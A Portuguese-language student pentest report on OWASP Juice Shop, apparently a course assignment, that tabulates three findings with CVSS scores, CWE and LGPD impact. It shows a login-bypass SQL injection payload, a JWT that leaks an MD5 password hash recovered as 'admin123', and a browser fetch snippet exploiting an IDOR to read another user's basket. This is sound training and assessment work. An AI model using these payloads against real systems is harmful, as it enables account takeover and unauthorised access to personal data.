# Tabela de achados (Seção 7.3 do roteiro)

Faixas CVSS: None 0.0 · Low 0.1–3.9 · Medium 4.0–6.9 · High 7.0–8.9 · Critical 9.0–10.0.
Calculadora oficial: https://www.first.org/cvss/calculator/3.1
Vetores CVSS completos e evidências estão em "Provas reprodutíveis", abaixo da tabela.

| ID  | Achado                              | OWASP | CWE         | Severidade      | Impacto (CID / LGPD)                 |
| --- | ----------------------------------- | ----- | ----------- | --------------- | ------------------------------------ |
| V1  | SQLi no login (`' OR 1=1--`)        | A03   | CWE-89      | **9.1 Crítico** | Integr. e Confid.; dados de clientes |
| V2  | Senhas retornam no MD5 do JWT       | A02   | CWE-327/311 | **7.5 Alto**    | Confid.; revela senha real           |
| V3  | IDOR na cesta (`/rest/basket/{id}`) | A01   | CWE-639/284 | **6.5 Médio**   | Confid.; dado de terceiro            |
| V4  | _a fazer_                           |       |             |                 |                                      |
| V5  | _a fazer_                           |       |             |                 |                                      |
| V6  | _a fazer_                           |       |             |                 |                                      |

---

## Provas reprodutíveis

**V1 — SQLi no login (A03).**
Vetor: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N` = 9.1 Crítico.
Campo e-mail = `' OR 1=1--`, senha qualquer. Autentica como `admin@juice-sh.op` sem saber a senha.

**V2 — Senha em MD5 vazada no JWT (A02).**
Vetor: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` = 7.5 Alto.
O token retornado no login carrega o campo `password`. Decodificando o payload (Base64) do JWT:

```
{"data":{"id":1,"email":"admin@juice-sh.op","password":"0192023a7bbd73250516f069df18b500", bid...}}
```

Confirmação de que o hash é MD5 de uma senha trivial:

```
$ printf '%s' 'admin123' | md5sum
0192023a7bbd73250516f069df18b500   <- idêntico ao hash no token JWT
```

**V3 — IDOR na cesta (A01).**
Vetor: `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N` = 6.5 Médio.
Autenticado como user 1, no Console do navegador:

```javascript
fetch("/rest/basket/2", {
  headers: { Authorization: "Bearer " + localStorage.getItem("token") },
})
  .then((r) => r.json())
  .then(console.log);
// Retorna (cesta de OUTRO usuário)
```

Sem o cabeçalho `Authorization` o servidor responde 401 (esperado);
Adicionando meu token de usuário pedindo recurso, deveria responder 403, mas responde 200 daí o controle de acesso quebrado.

---

## Origem dos achados

Os três "achados" foram **apontados/exemplificados pelo próprio roteiro e em aula pelo professor** — o roteiro é um guia. A contribuição da equipe foi em reproduzir, e classificar = **evidência reprodutível, no vetor CVSS, na classificação CWE e na relação com CID/LGPD**.

- **V1 (A03):** o roteiro traz `' OR 1=1 --` como payload de exemplo e a linha de `sqlmap`.
- **V3 (A01):** o roteiro cita textualmente `/rest/basket/{id}` e "trocar o ID na URL".
- **V2 (A02):** o roteiro lista "algoritmos fracos (MD5, DES)" e "procure hashes/segredos expostos".

## Escopo e divisão de trabalho

- **Exigência do roteiro (Seção 4):** mínimo **6 categorias**, obrigatórias **A01, A02, A03**.
- **Feito até aqui (V1–V3):** as 3 categorias obrigatórias, com evidência, CVSS e LGPD.
- **Falta (V4–V6):** mais 3 categorias quaisquer (A04–A10) — a cargo do restante do grupo.
  Candidatas fáceis no Juice Shop: A05 (misconfiguration), A06 (componentes desatualizados), A07 (autenticação fraca).
- Para categorias que a equipe optar por **não** cobrir, o relatório deve **justificar** por que não se aplicam ou não foram observadas (também exigido pela Seção 4).
